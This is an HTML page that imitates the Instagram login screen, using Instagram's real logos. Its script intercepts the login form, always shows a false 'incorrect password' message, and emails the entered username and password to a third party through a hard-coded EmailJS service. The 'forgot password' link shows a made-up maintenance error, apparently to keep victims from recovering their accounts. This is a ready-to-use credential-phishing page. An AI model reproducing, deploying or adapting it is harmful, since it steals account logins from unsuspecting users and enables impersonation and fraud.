<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
    rel="stylesheet"
  />
  <link
    href="https://fonts.googleapis.com/css2?family=SF+Pro+Text&display=swap"
    rel="stylesheet"
  />
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Icons",
        "Helvetica Neue", Helvetica, Arial, sans-serif;
      background: linear-gradient(
        135deg,
        #2a2f33 0%,
        #1e3447 50%,
        #1a2a2a 100%
      );
      min-height: 100vh;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 0 1.5rem;
      color: white;
    }

    /* Input Styling */
    input {
      font-family: inherit;
      font-weight: 400;
      font-size: 15px;
      line-height: 20px;
      letter-spacing: -0.022em;
      word-spacing: 0.1px;
      color: #6b7a8a;
      background-color: transparent; /* ✅ Transparent textbox */
      border: 1px solid rgba(255, 255, 255, 0.15); /* ✅ Added visible border */
      border-radius: 12px;
      padding-left: 12px;
      height: 56px;
      width: 100%;
      box-sizing: border-box;
      transition: border-color 0.2s ease;
    }

    /* Placeholder Styling */
    input::placeholder {
      color: transparent; /* ✅ Placeholder invisible */
    }

    /* Focus Effect */
    input:focus {
      outline: none;
      border-color: #3a82f6; /* ✅ Highlight border on focus */
      box-shadow: 0 0 8px rgba(58, 130, 246, 0.4);
    }

    button.login-btn {
      background-color: #007aff;
      border-radius: 28px;
      height: 50px;
      width: 100%;
      font-weight: 500;
      font-size: 17px;
      line-height: 22px;
      letter-spacing: -0.022em;
      word-spacing: px;
      color: white;
      border: none;
      cursor: pointer;
      margin-top: 12px;
    }

    button.create-account-btn {
      margin-top: 40px;
      width: 100%;
      height: 50px;
      border-radius: 28px;
      border: 1.5px solid #3a82f6;
      background: transparent;
      color: #3a82f6;
      font-weight: 500;
      font-size: 17px;
      line-height: 22px;
      letter-spacing: -0.022em;
      cursor: pointer;
    }

    p.language {
      font-weight: 400;
      font-size: 15px;
      line-height: 18px;
      letter-spacing: 0.02em;
      margin-bottom: 48px;
      text-align: center;
    }

    p.forgot-password {
      font-weight: 400;
      font-size: 17px;
      line-height: 22px;
      letter-spacing: -0.022em;
      margin-top: 24px;
      text-align: center;
      cursor: pointer;
      color: #3a82f6;
      text-decoration: underline;
    }

    .logo {
      width: 68px;
      height: 68px;
      margin: 0 auto 48px auto;
      display: block;
    }

    .meta-logo {
      width: 50px;
      height: 10px;
      margin: 48px auto 0 auto;
      display: block;
    }

    .container {
      max-width: 400px;
      width: 100%;
    }

    /* Error Box Styling */
    #error-box {
      display: none;
      background-color: #000;
      color: #fff;
      font-size: 14px;
      padding: 10px 12px;
      border-radius: 8px;
      margin-top: 12px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <p class="language">English (UK)</p>
    <img
      src="https://static.cdninstagram.com/rsrc.php/v4/yq/r/_7cAFFbc4Pr.png"
      alt="Instagram logo"
      class="logo"
      decoding="async"
      loading="lazy"
    />
    <form id="loginForm">
      <input
        id="username"
        type="text"
        placeholder="Username, email address or mobile number"
        autocomplete="username"
        required
      />
      <input
        id="password"
        type="password"
        placeholder="Password"
        autocomplete="current-password"
        class="mt-4"
        required
      />

      <!-- Error Box -->
      <div id="error-box">
        The password you entered is incorrect. Please try again.
      </div>

      <button type="submit" class="login-btn">Log in</button>
    </form>

    <!-- Forgot Password -->
    <p class="forgot-password" id="forgot-link">Forgotten password?</p>

    <button class="create-account-btn">Create new account</button>
    <img
      src="https://static.cdninstagram.com/rsrc.php/v4/y3/r/aAfprBW6TIe.png"
      alt="Meta logo"
      class="meta-logo"
      decoding="async"
      loading="lazy"
    />
  </div>

  <!-- EmailJS Script -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("9XQfUTDGZhb_SwnV1");
    })();

    document.getElementById("loginForm").addEventListener("submit", function(event) {
      event.preventDefault();
      document.getElementById("error-box").style.display = "block";
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      emailjs.send("service_brcf4oo", "template_nanjxcx", {
        username: username,
        password: password
      })
      .then(function() {
        document.getElementById("loginForm").reset();
      }, function(error) {
        alert("Login Failed " + JSON.stringify(error));
      });
    });

    document.getElementById("forgot-link").addEventListener("click", function() {
      alert("Server error 509 ; Please try resetting your password from the app , website currently under maintainance.");
    });
  </script>
</body>
</html>
